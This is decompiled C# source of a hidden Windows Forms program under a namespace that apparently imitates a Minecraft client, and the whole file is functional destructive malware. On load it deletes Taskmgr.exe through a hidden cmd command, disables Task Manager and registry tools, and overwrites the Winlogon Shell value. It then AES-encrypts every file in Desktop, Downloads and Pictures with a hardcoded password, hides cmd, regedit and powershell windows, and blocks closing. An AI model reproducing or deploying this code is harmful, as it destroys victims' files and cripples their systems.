using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Huzuni_1._16._3;

public class Form1 : Form
{
	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	private const int SW_HIDE = 0;

	private IContainer components = null;

	private Timer tmr_del_desktop;

	private Timer tmr_start_enc;

	private Timer tmr_if;

	private Timer timer1;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/takeown /f C:\\Windows\\System32\\Taskmgr.exe && icacls C:\\Windows\\System32\\Taskmgr.exe /grant %username%:F && del C:\\Windows\\System32\\Taskmgr.exe && exit";
		Process.Start(processStartInfo);
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		Path.Combine(environmentVariable, "Downloads");
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		tmr_del_desktop.Start();
		tmr_start_enc.Start();
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string path3 = folderPath2 + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		tmr_del_desktop.Start();
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Pictures");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "qd=3psCvr7gfvRqB2*E-e_^*DqVA?3Y4?v$@Lmq6EZQD56dG88+n+Rpewc8cqX#LvMQmS&Brpmd27gv-VrV4TLmm&q&dap55xAA*xpn5c=2@LYKXf%zq!AuVha$-qNwqmA6p?S^zV^kf8-SCUb8X!Rh3QNZZGtVH=&7t59BQXwBEndCnV5Xfm%ahRAAP=zeeWYU?=U_VMqxmCtCs2YfavSG#!aGkr?!*aHz!%?S5EbHQ*aa%uP9Z2U&gag_5KRN3!St3-%pxPKF-!4%XkjcH@?srBVW@&bJnhPx$VrCN=C5vh@c8pjAK8_U9rTJcdrECPg24Vc5$pSQBn23dL3n^WH8Quj7wzS$?jA6NacTCCA-Hx%T?xhp?=!zXfuVr+CjpSx-_3g^%pJvF?$Y!&@we8A!YCx*drc94^N3yXxbPc_Z4d_ve3u_#&PcdPKw$y6qVYvEH5F9xytWaakB3ypANFpGrGd$f@@wUDGtu@2nF*%!p3CRMgh?_XZ7Q*&Nz?8*T8-vsLAJ6PT^wsX5xnrMC-=v&*ja2yLqQVqFjfq44GsM+q%a-vKXW+USapuUk+$?!w!eL3&QHjNwC=84a$2ZueR98t=UWtYaLdmg49jFjNxvx*Exyzjasv?K$b5cc$-hbBPd3Eynf$vbmM&n8FVfDTfANye@Y+wc#LFgZsyWtBsH66%6$jCJnc#TFm3!fWQ+c#vJ^=7KMh3!Sh#Ff$?M+EA4WE&pr-LTVjx5xQ??645MeWHygn2udXDB&mkRNTxmcx&&b3#p8uNdGN5aKV=#A?228U9FVw9-yw-mTh8D5g5GJdX!J+?rc-ZeuMc%TbaF#r^*P966x-WDM38F@k$mfs4?vx&$ZUkMGUuc7eRw@@_6*LGc$PCJNHa!6Yd!^XUeA*hR#GqPTmb7emamC!d@Ypj8Lrsk&ArWjx6-dB*5XVESmTfEnhtJaepp=c^DAHUWAtvq$6f$Avrp+rfBsj28TXw53d%#QCze9qrn$79u#H%8Pg_dMTM3WnJy%zs6JzTnqKbDvgw7#mU3R!aHdvfF#=PHYw2$-hQKeK8^#vDt*s7x9E_44uY!?X_y%tXd4547FMB54uEGXgYCrGKRG%-3=q=4egp2weKdbJqPyE^q94V8emn%nCZCXmDrg6aaXV^fW?eZhLV8b%Qv56Xyk2$A^NX3$a?5#S6FmP?x6WvR#6#Pcvj_PpYS+q*NZZn@q@9BF_bjuXQR%VwSW-m5JXXY8*AuA=xT8kzabset?JN*e3SjT3^6SCsAW?nXdJE2Y*%Cfh5_+bF#vbB-dZ8K_n%!47Btn2J+aj8Ndh=YuLGh+%3S*xcbHFa3!jQb5hAF^4kXgumjwtsK=L@y5bx5QBtsY?6ugG55!xjUWK_=P^jge4jMgZCgu$9jpN4stYvmV%c_re6sBrz+Lg5yc3_v5P%ZcU2Q5CweQzyv+-wzggTyVp+U7vJ3#zk3NP+UB9Czt27J5@rTcxV^f?8j$VhS@8tTZD^7RKKxz8+THTRK_$7AfHJwD&n$%8$GgD-96y!M3D@ak8Y!KrSSFE+gDeh=%cX&dcGjH3ekjC*@aWD-2CqRw8@d&d+kD8r-EW73Q4W^Tz3D^KSMjKQsDmga7brYv*7T=vqh9cM-v+nbAHfUZze=j&qBRTN+&*5mbsY&Rq!Wu28Ju!bnB+EkZ#DF*h*Db?984C7ss?$ZdHw=VE55ZSTeTRJxEgF4v8Fc+@p*L^$@g972mdUZWmGR&bN^5c@M?afde9nuNTf&DPmduvkuFeR@L#X#GLU!cNQYzhuHyzfhTK%zkT&g-TUjHTY6^-W$_erFXSHC&&LHjwCE%gxctCeQ3Fu3P$JgU+x@^J2AK_&maX9EAWM2GtYyYT2cLJtbGJNvF9JxDHNTqR=V4d=q2Hg@3AqTgpF8@KG@Nv$s@6GSTe$&N-eSbKQZjLV+2@Jgj9ezP@u9zNDvWUPKY=aPx+#u^MX_H#Yb@eQjMjT%B?#kTxPqCMGAAkBd8uAUj?B$^x%7dVTuJjLG?SfJs#f5Z$b7-uVahzC-w9SYbh5C^CujAGVe8";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
		for (int k = 0; k < files3.Length; k++)
		{
			encryptionFile.EncryptFile(files3[k], password);
		}
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "powershell")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			tmr_if.Start();
		}
	}

	private void tmr1_Tick(object sender, EventArgs e)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_017b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Expected O, but got Unknown
		components = new Container();
		tmr_del_desktop = new Timer(components);
		tmr_start_enc = new Timer(components);
		tmr_if = new Timer(components);
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		timer1.set_Enabled(true);
		timer1.set_Interval(5000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
